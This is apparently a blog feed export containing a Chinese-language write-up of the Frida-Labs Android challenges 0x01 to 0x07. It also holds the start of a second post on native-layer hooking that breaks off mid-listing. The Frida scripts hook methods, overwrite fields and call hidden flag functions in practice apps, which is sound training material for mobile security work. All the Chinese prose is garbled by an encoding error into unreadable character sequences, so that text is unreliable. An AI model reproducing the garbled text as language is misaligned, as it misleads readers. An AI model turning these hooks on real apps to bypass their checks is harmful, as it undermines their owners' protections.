        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h1><h2 id="ä¸‹è½½åœ°å€ï¼š"><a href="#ä¸‹è½½åœ°å€ï¼š" class="headerlink" title="ä¸‹è½½åœ°å€ï¼š"></a>ä¸‹è½½åœ°å€ï¼š</h2><p><a href="https://github.com/DERE-ad2001/Frida-Labs">DERE-ad2001&#x2F;Frida-Labsï¼šè¯¥ä»“åº“åŒ…å«ä¸€ç³»åˆ—å­¦ä¹  Frida for Android Exploitation çš„æŒ‘æˆ˜ã€‚ â€” DERE-ad2001&#x2F;Frida-Labs: The repo contains a series of challenges for learning Frida for Android Exploitation. (github.com)</a></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407271737543.png" alt="image-20240727173730434"> </p><h2 id="ä»‹ç»-1"><a href="#ä»‹ç»-1" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h2><p>é¡¹ç›®ä¸­åŒ…å«äº†11ä¸ªä¸åŒçš„å®æˆ˜æ¡ˆä¾‹ï¼Œåˆ†åˆ«ä»javaå±‚åˆ°Nativeå±‚ï¼Œä»‹ç»äº†å¸¸è§çš„Frida APIä½¿ç”¨åœºæ™¯ï¼š</p><ul><li>challenge 0x01ï¼šhookæ™®é€šæ–¹æ³•</li><li>challenge 0x02ï¼šè°ƒç”¨é™æ€æ–¹æ³•</li><li>challenge 0x03ï¼šæ›´æ”¹å˜é‡çš„å€¼</li><li>challenge 0x04ï¼šåˆ›å»ºå®ä¾‹å¯¹è±¡</li><li>challenge 0x05ï¼šåœ¨ç°æœ‰å®ä¾‹ä¸Šè°ƒç”¨æ–¹æ³•</li><li>challenge 0x06ï¼šè°ƒç”¨å¸¦æœ‰å¯¹è±¡å‚æ•°çš„æ–¹æ³•</li><li>challenge 0x07ï¼šhookæ„é€ å‡½æ•°</li><li>challenge 0x08ï¼šhook soå±‚å‡½æ•°</li><li>challenge 0x09ï¼šæ›´æ”¹soå±‚å‡½æ•°è¿”å›å€¼</li><li>challenge 0x0Aï¼šè°ƒç”¨åŸç”Ÿå‡½æ•°</li><li>challenge 0x0Bï¼šä½¿ç”¨ X86Writer å’Œ ARM64Writer ä¿®è¡¥æ±‡ç¼–</li></ul><h1 id="challenge-0x01"><a href="#challenge-0x01" class="headerlink" title="challenge 0x01"></a>challenge 0x01</h1><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407271746119.png" alt="image.png"> </p><p>1ã€æç¤ºã€Try againã€‘ã€‚ä½¿ç”¨jadxåç¼–è¯‘åæ‰“å¼€ï¼Œå®šä½åˆ°å…³é”®ä»£ç å¤„ï¼š</p><ul><li>å¯ä»¥ç›´æ¥æœç´¢ â€œTry againâ€ï¼Œé€‚ç”¨äºä»£ç è¾ƒå¤šçš„æƒ…å†µä¸‹</li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407271746405.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407271746264.png" alt="image.png"> </p><ul><li>ä»£ç æ¯”è¾ƒå°‘ï¼Œå¯ä»¥ç›´æ¥çœ‹MainActivityç±»</li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407271746195.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407271746956.png" alt="image.png"> </p><p>2ã€åˆ†æä»£ç ï¼Œå¯ä»¥å…ˆå®šä½åˆ° <strong>check</strong> å‡½æ•°</p><p>å½“(i * 2) + 4 &#x3D;&#x3D; i2çš„æ—¶å€™ï¼Œå¯ä»¥æ‰§è¡Œä¸‹ä¸€æ­¥çš„ä»£ç </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(i * 2) + 4 == i2</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407271747256.png" alt="image.png"> </p><p>3ã€æŸ¥çœ‹è°ƒç”¨äº†checkå‡½æ•°çš„åœ°æ–¹ï¼Œå®šä½åˆ°äº† oncreate å‡½æ•°</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407271747889.png" alt="image.png"> </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MainActivity.this.check(i, Integer.parseInt(obj));</span><br></pre></td></tr></table></figure><p>å…¶ä¸­å‚æ•° i å’Œ Integer.parseInt(obj)åˆ†åˆ«ä¸ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">final int i = get_random();   //é€šè¿‡get_randomå¾—åˆ°</span><br><span class="line">String obj = editText.getText().toString();  //ç”¨æˆ·è¾“å…¥</span><br></pre></td></tr></table></figure><p>3ã€æ‰€ä»¥ï¼Œå¯ä»¥å¾—åˆ°é€»è¾‘ä¸ºï¼š</p><p>é€šè¿‡get_random()å‡½æ•°å¾—åˆ°çš„éšæœºå€¼ï¼Œç»è¿‡è¿ç®—åï¼Œå¾—åˆ°æˆ‘ä»¬è¾“å…¥çš„å€¼å³å¯é€šè¿‡æ ¡éªŒã€‚</p><p>æ‰€ä»¥ï¼Œè¿™å—åªéœ€è¦hookæ‰ get_random()å‡½æ•°ï¼Œè®©ä»–è¿”å›ä¸€ä¸ªå›ºå®šå€¼å³å¯ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407271747367.png" alt="image.png"> </p><p>4ã€Fridaä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> className = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.ad2001.frida0x1.MainActivity&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> method = className.<span class="property">get_random</span>;</span><br><span class="line"></span><br><span class="line">    method.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;get_random function called&quot;</span>);</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Returning 5&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">5</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">setImmediate</span>(main);</span><br></pre></td></tr></table></figure><p>ç›´æ¥è®© get_random å‡½æ•°çš„è¿”å›å€¼ä¸º5ï¼Œåˆ™ç”¨æˆ·è¾“å…¥åº”è¯¥ä¸º 5*2+4&#x3D;14</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407271748402.png" alt="image.png"> </p><h1 id="challenge-0x02"><a href="#challenge-0x02" class="headerlink" title="challenge 0x02"></a>challenge 0x02</h1><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407271750644.png" alt="image.png"> </p><p>1ã€å®šä½åˆ°MainActivityç±»ä¸­ï¼Œæ‰¾åˆ°äº†get_flagå‡½æ•°</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407271751607.png" alt="image.png"> </p><p>2ã€å…¨å±€æœç´¢ï¼Œæ²¡æœ‰å‘ç°è°ƒç”¨ get_flagå‡½æ•°çš„åœ°æ–¹ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œè¿™å—å®šä¹‰äº†ä¸€ä¸ªå‡½æ•°ï¼Œä½†æ˜¯æ²¡æœ‰åšå¼•ç”¨</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407271751074.png" alt="image.png"> </p><p>3ã€æ‰€ä»¥ï¼Œè¿™å—ä½¿ç”¨Fridaè°ƒç”¨ get_flagå‡½æ•°ï¼Œå¹¶ä¸”è¦æ±‚ä¼ å…¥çš„å‚æ•°ä¸º 4919</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407271751803.png" alt="image.png"> </p><p>4ã€ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> a = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.ad2001.frida0x2.MainActivity&quot;</span>);</span><br><span class="line">       </span><br><span class="line">        a.<span class="title function_">get_flag</span>(<span class="number">4919</span>);  <span class="comment">// method name</span></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">setImmediate</span>(main);</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407271752348.png" alt="image.png"> </p><p>5ã€ä¹Ÿå¯ä»¥ä¸å†™è„šæœ¬ï¼Œç›´æ¥fridaä¸­è¾“å…¥ä»£ç hookå³å¯ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407271754982.png" alt="image-20240727175406935"> </p><h1 id="challenge-0x03"><a href="#challenge-0x03" class="headerlink" title="challenge 0x03"></a>challenge 0x03</h1><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407271816418.png" alt="image.png"> </p><p>1ã€jadxæŸ¥çœ‹MainActivityç±»ï¼Œå®šä½åˆ°äº†onClickæ–¹æ³•ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407271816297.png" alt="image.png"> </p><p>2ã€æŸ¥çœ‹ä»£ç é€»è¾‘ï¼Œå½“Checker.code &#x3D;&#x3D; 512çš„æ—¶å€™ï¼Œæ‰§è¡Œåç»­ä»£ç ï¼Œå½“ä¸ç­‰äº512çš„æ—¶å€™ï¼Œè¿”å› try againï¼</p><p>å®šä½åˆ°Checker.codeå¤„ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407271817926.png" alt="image.png"> </p><p>codeæ˜¯ä¸€ä¸ªé™æ€æˆå‘˜å˜é‡ã€‚</p><p>3ã€è¿™å—æœ‰ä¸¤ç§æ–¹æ³•è¿›è¡ŒHOOkï¼š</p><p>â‘ ç›´æ¥hookä¿®æ”¹é™æ€æˆæœ¬å˜é‡Checker.codeçš„å€¼</p><p>â‘¡hook increaseæ–¹æ³•ï¼Œä½¿ç”¨forå¾ªç¯æ‰§è¡Œ 512&#x2F;2&#x3D;216æ¬¡</p><p>æ–¹æ³•ä¸€ï¼šHookæˆå‘˜å˜é‡</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> a = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.ad2001.frida0x3.Checker&quot;</span>);  <span class="comment">// class reference</span></span><br><span class="line">        a.<span class="property">code</span>.<span class="property">value</span> = <span class="number">512</span>;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">setImmediate</span>(main);</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407271817504.png" alt="image.png"> </p><p>æ–¹æ³•äºŒï¼šHookå¯¹åº”æ–¹æ³•</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//æ–¹æ³•ä¸€</span></span><br><span class="line">        <span class="comment">// var a = Java.use(&quot;com.ad2001.frida0x3.Checker&quot;);  // class reference</span></span><br><span class="line">        <span class="comment">// a.code.value = 512;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//æ–¹æ³•äºŒ</span></span><br><span class="line">        <span class="keyword">var</span> className = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.ad2001.frida0x3.Checker&quot;</span>);  <span class="comment">// class reference</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>; i &lt;= <span class="number">256</span>; i++) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Calling increase() method &quot;</span> + i + <span class="string">&quot; times&quot;</span>);</span><br><span class="line">            className.<span class="title function_">increase</span>();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> code_value = className.<span class="property">code</span>.<span class="property">value</span>;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Current variable value: &quot;</span> + code_value);</span><br><span class="line">        &#125;      </span><br><span class="line">    </span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">setImmediate</span>(main);</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407271818574.png" alt="image.png"> </p><h1 id="challenge-0x04"><a href="#challenge-0x04" class="headerlink" title="challenge 0x04"></a>challenge 0x04</h1><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407271818212.png" alt="image.png"> </p><p>1ã€jadxåç¼–è¯‘åå®šä½åˆ°äº†MainActivityï¼ŒæŸ¥çœ‹åæ²¡æœ‰å‘ç°æœ‰ç”¨ä¿¡æ¯ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407271823551.png" alt="image.png"> </p><p>2ã€æŸ¥çœ‹å¦ä¸€ä¸ªç±»Checkï¼Œé‡Œé¢å®šä¹‰äº†ä¸€ä¸ª get_flagæ–¹æ³•</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407271823662.png" alt="image.png"> </p><p>3ã€è¦æ±‚ä¼ å…¥çš„å‚æ•°å€¼a &#x3D; 1337ï¼Œæ‰ä¼šç»§ç»­å‘ä¸‹æ‰§è¡Œã€‚</p><p>ç”±äºæ²¡æœ‰åœ¨MainActivityä¸­å‘ç°å®ä¾‹åŒ–çš„Checkç±»ã€‚</p><p>æ‰€ä»¥ï¼Œå¯ä»¥å…ˆä½¿ç”¨$new()æ–°å»ºä¸€ä¸ªCheckçš„å®ä¾‹å¯¹è±¡ï¼Œç„¶åè°ƒç”¨get_flagæ–¹æ³•ï¼Œæ‰“å°è¾“å‡ºå³å¯ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> check = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.ad2001.frida0x4.Check&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> check_obj = check.$new(); <span class="comment">// Class Object</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> res = check_obj.<span class="title function_">get_flag</span>(<span class="number">1337</span>); <span class="comment">// Calling the method</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;FLAG--1 &quot;</span> + res);</span><br><span class="line"></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">setImmediate</span>(main);</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407271823924.png" alt="image.png"> </p><p>è¿™å—çš„get_flagæ–¹æ³•æ˜¯éé™æ€æ–¹æ³•ï¼Œåˆ›å»ºå®ä¾‹åä¹Ÿå¯ä»¥ä½¿ç”¨Java.chooseæ¥è¿›è¡Œhookå®šä½</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> check = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.ad2001.frida0x4.Check&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> check_obj = check.$new(); <span class="comment">// Class Object</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//æ–¹æ³•ä¸€</span></span><br><span class="line">        <span class="keyword">var</span> res = check_obj.<span class="title function_">get_flag</span>(<span class="number">1337</span>); <span class="comment">// Calling the method</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;FLAG--1 &quot;</span> + res);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//æ–¹æ³•äºŒ</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&#x27;com.ad2001.frida0x4.Check&#x27;</span>, &#123;</span><br><span class="line">            <span class="attr">onMatch</span>: <span class="keyword">function</span>(<span class="params">instance</span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Found `HookedObject` instance:&quot;</span>, instance);</span><br><span class="line">                <span class="keyword">var</span> res = instance.<span class="title function_">get_flag</span>(<span class="number">1337</span>);</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;FLAG--2 &quot;</span> + res);</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Found Completed&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">setImmediate</span>(main);</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407271824487.png" alt="image.png"> </p><h1 id="challenge-0x05"><a href="#challenge-0x05" class="headerlink" title="challenge 0x05"></a>challenge 0x05</h1><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407271824534.png" alt="image.png"> </p><p>jadxåç¼–è¯‘ï¼Œå®šä½åˆ°å…³é”®å‡½æ•°ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407271824392.png" alt="image.png"> </p><p>æŸ¥çœ‹å…³é”®ä»£ç  if (code &#x3D;&#x3D; 1337) çš„æ‰§è¡Œå‡½æ•°åç»­ä»£ç ï¼š</p><p>æ‰€ä»¥ï¼Œè¿™å—å¯ä»¥å‚è€ƒä¸ŠèŠ‚demoçš„åšæ³•ã€‚</p><p>è¿™å—æœ‰ä¸ªé—®é¢˜ï¼Œå°±æ˜¯ä¸èƒ½ç›´æ¥ $new åˆ›å»ºä¸€ä¸ªå®ä¾‹åå†è°ƒç”¨ flag æ–¹æ³•ã€‚</p><p>åŸå› ï¼šflagå‡½æ•°åœ¨MainActivityç±»ä¸­ï¼Œä¸€èˆ¬MainActivityæ˜¯ç”±ç¨‹åºç›´æ¥åˆ›å»ºçš„ï¼Œä¸ä¼šé€šè¿‡ä»£ç æ¥è°ƒç”¨ã€‚</p><p>æ‰€ä»¥ï¼Œè¿™å—ä½¿ç”¨ Java.choose å®šä½åˆ°å®ä¾‹ï¼Œç„¶åå†è°ƒç”¨å³å¯ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;com.ad2001.frida0x5.MainActivity&quot;</span>,&#123;</span><br><span class="line">            <span class="attr">onMatch</span>: <span class="keyword">function</span>(<span class="params">instance</span>)&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Found MainActivity instance: &quot;</span> + instance);</span><br><span class="line">                instance.<span class="title function_">flag</span>(<span class="number">1337</span>);</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;</span><br><span class="line">        &#125; )</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">setImmediate</span>(main);</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407271825098.png" alt="be5e86773b1bc66d0102b73b08a3bd8.png"> </p><h1 id="challenge-0x06"><a href="#challenge-0x06" class="headerlink" title="challenge 0x06"></a>challenge 0x06</h1><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407271915745.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407271915856.png" alt="image.png"> </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (1234 == A.num1 &amp;&amp; 4321 == A.num2)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407271915240.png" alt="image.png"> MainActivityä¸­çš„get_flagæ–¹æ³•ï¼Œä¼ å‚ä¸º Checkerçš„ä¸€ä¸ªå®ä¾‹ã€‚</p><p>ä½†æ˜¯æ²¡æœ‰åœ¨MainActivityä¸­å‘ç°è°ƒç”¨get_flagæ–¹æ³•çš„ä»£ç ï¼Œæ‰€ä»¥ï¼Œè¿™å—éœ€è¦å®šä½åˆ°å®ä¾‹åä¸»åŠ¨è°ƒç”¨ï¼›</p><p>å› ä¸ºifåˆ¤æ–­ä¸­å¯¹Checkç±»çš„ä¸¤ä¸ªæˆå‘˜å˜é‡æœ‰è¦æ±‚ï¼Œæ‰€ä»¥ï¼Œè¿˜éœ€è¦å®ä¾‹åŒ–ä¸€ä¸ªCheckç±»å¹¶å¯¹æˆå‘˜å˜é‡è¿›è¡Œåˆå§‹åŒ–ã€‚</p><p>ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&#x27;com.ad2001.frida0x6.MainActivity&#x27;</span>, &#123;</span><br><span class="line">          <span class="attr">onMatch</span>: <span class="keyword">function</span>(<span class="params">instance</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Instance found&quot;</span>);</span><br><span class="line">      </span><br><span class="line">            <span class="keyword">var</span> checker = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.ad2001.frida0x6.Checker&quot;</span>);</span><br><span class="line">            <span class="keyword">var</span> checker_obj  = checker.$new();  <span class="comment">// Class Object</span></span><br><span class="line">            checker_obj.<span class="property">num1</span>.<span class="property">value</span> = <span class="number">1234</span>; <span class="comment">// num1</span></span><br><span class="line">            checker_obj.<span class="property">num2</span>.<span class="property">value</span> = <span class="number">4321</span>; <span class="comment">// num2</span></span><br><span class="line">            instance.<span class="title function_">get_flag</span>(checker_obj); <span class="comment">// invoking the get_flag method</span></span><br><span class="line">      </span><br><span class="line">          &#125;,</span><br><span class="line">          <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407271915963.png" alt="image.png"> </p><h1 id="challenge-0x07"><a href="#challenge-0x07" class="headerlink" title="challenge 0x07"></a>challenge 0x07</h1><p>æœ¬è´¨æ˜¯è¦Hookæ„é€ å‡½æ•° : <strong>$init</strong></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407271916674.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407271916532.png" alt="image.png"> </p><p>ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;com.ad2001.frida0x7.MainActivity&quot;</span>, &#123;</span><br><span class="line">            <span class="attr">onMatch</span>: <span class="keyword">function</span>(<span class="params">instance</span>) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Found instance of MainActivity&quot;</span>);</span><br><span class="line">                <span class="keyword">var</span> check_class = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.ad2001.frida0x7.Checker&quot;</span>);</span><br><span class="line">                <span class="comment">// check_class.$init.implementation = function(arg1, arg2) &#123;</span></span><br><span class="line">                <span class="comment">//     console.log(&quot;Check class initialized&quot;);</span></span><br><span class="line">                <span class="comment">//     arg1 = 513;</span></span><br><span class="line">                <span class="comment">//     arg2 = 513;</span></span><br><span class="line">                <span class="comment">//     return this.$init(arg1, arg2);</span></span><br><span class="line">                <span class="comment">// &#125;</span></span><br><span class="line">                instance.<span class="title function_">flag</span>(check_class.$new(<span class="number">513</span>, <span class="number">513</span>));</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Done&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;); </span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">setImmediate</span>(main);</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202407/202407271920866.png" alt="image.png"> </p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> frida-labs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fridaNativeå±‚hook</title>
      <link href="/2024/07/14/frida%20Native%E5%B1%82hook/"/>
      <url>/2024/07/14/frida%20Native%E5%B1%82hook/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="0x00-æµ‹è¯•ç”¨ä¾‹"><a href="#0x00-æµ‹è¯•ç”¨ä¾‹" class="headerlink" title="0x00 æµ‹è¯•ç”¨ä¾‹"></a>0x00 æµ‹è¯•ç”¨ä¾‹</h1><p>æœ¬æ¬¡çš„hookä»£ç éƒ½ç”¨ frida-toolsæ–¹å¼ ä¹¦å†™ã€‚é¦–å…ˆå†™ä¸€ä¸ªç®€å•çš„ç¨‹åºç”¨æ¥æµ‹è¯•ã€‚åç»­çš„æµ‹è¯•å°±åœ¨è¿™ä¸ªç¨‹åºä¸Šå°ä¿®å°æ”¹ï¼Œä¸åšèµ˜è¿°ã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;LinearLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;</span><br><span class="line">    xmlns:app=&quot;http://schemas.android.com/apk/res-auto&quot;</span><br><span class="line">    xmlns:tools=&quot;http://schemas.android.com/tools&quot;</span><br><span class="line">    android:id=&quot;@+id/layout_main&quot;</span><br><span class="line">    android:layout_width=&quot;match_parent&quot;</span><br><span class="line">    android:layout_height=&quot;match_parent&quot;</span><br><span class="line">    tools:context=&quot;.MainActivity&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;Button</span><br><span class="line">        android:id=&quot;@+id/btn_print&quot;</span><br><span class="line">        android:layout_width=&quot;wrap_content&quot;</span><br><span class="line">        android:layout_height=&quot;wrap_content&quot;</span><br><span class="line">        android:layout_margin=&quot;10dp&quot;</span><br><span class="line">        android:text=&quot;print()&quot; /&gt;</span><br><span class="line"></span><br><span class="line">    &lt;Button</span><br><span class="line">        android:id=&quot;@+id/btn_add&quot;</span><br><span class="line">        android:layout_width=&quot;wrap_content&quot;</span><br><span class="line">        android:layout_height=&quot;wrap_content&quot;</span><br><span class="line">        android:layout_margin=&quot;10dp&quot;</span><br><span class="line">        android:text=&quot;addThreeNum()&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;/LinearLayout&gt;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.zyc.fridasodemo;</span><br><span class="line"></span><br><span class="line"><span 